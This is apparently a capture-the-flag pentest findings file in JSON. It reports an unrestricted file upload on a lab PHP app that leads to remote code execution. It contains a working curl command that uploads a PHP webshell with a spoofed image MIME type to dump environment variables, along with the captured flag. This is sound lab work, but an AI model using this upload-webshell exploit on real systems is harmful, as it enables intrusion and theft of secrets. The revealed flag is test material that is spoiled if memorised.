@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:52:32.816654+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "2dc013dc-dfda-49d6-88fe-bbfd87560ba3",
+      "timestamp": "2026-04-12T21:52:32.816571+00:00",
+      "title": "Unrestricted File Upload \u2192 RCE \u2192 Environment Variable Disclosure (FLAG)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:42411/",
+      "description": "The image upload application at index.php performs no server-side validation of uploaded file content \u2014 only the client-supplied MIME type is checked (if at all). An attacker can upload a PHP webshell with Content-Type: image/jpeg and the server will save and execute it under /upload/. Executing the shell reveals all server environment variables including FLAG.",
+      "evidence": "1. Uploaded shell.php (PHP code) with MIME type image/jpeg \u2014 accepted and stored at /upload/shell.php\n2. GET /upload/shell.php \u2192 PHP executed: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n3. Uploaded envshell.php with getenv() call \u2014 returned: FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}\n\nFULL FLAG: flag{dc97f359-f228-492b-b344-038f3d712a73}",
+      "tool_used": "curl + manual HTTP",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "echo '<?php print_r(getenv()); ?>' > /tmp/envshell.php && curl -X POST http://172.17.0.1:42411/index.php -F 'userfile=@/tmp/envshell.php;filename=envshell.php;type=image/jpeg' -F 'submit=Upload Image' && curl http://172.17.0.1:42411/upload/envshell.php",
+        "expected": "FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "261f458a-a3e8-46ea-a5ed-11c809b78766",
+      "timestamp": "2026-04-12T21:52:40.097941+00:00",
+      "title": "Image Upload App Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Form[\"Upload Form / index.php\"]\n  Form -->|\"multipart POST userfile\"| Upload[\"Apache PHP Handler\"]\n  Upload -->|\"stores file\"| UploadDir[\"/upload/ directory\"]\n  Upload -->|\"no content validation\"| Shell[\"PHP Webshell Executed\"]\n  Shell -->|\"getenv()\"| Env[\"ENV: FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}\"]\n  Shell -->|\"system()\"| RCE[\"RCE as www-data\"]"
+    }
+  ]
+}
